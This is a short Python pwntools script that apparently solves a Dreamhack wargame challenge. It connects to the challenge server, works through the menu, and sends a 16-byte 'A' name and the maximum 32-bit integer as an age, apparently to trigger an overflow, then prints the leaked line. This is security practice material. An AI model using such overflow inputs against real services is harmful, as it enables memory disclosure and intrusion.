from pwn import *

port = 15593
rem = remote("host3.dreamhack.games", port)

rem.sendlineafter(b"> ", b"3")

rem.sendlineafter(b"> ", b"1")
rem.sendlineafter(b"Name: ", b"A" * 16)
rem.sendlineafter(b"Age: ", b"2147483647")

rem.sendlineafter(b"> ", b"2")

rem.recvn(26)
print(rem.recvline().rstrip())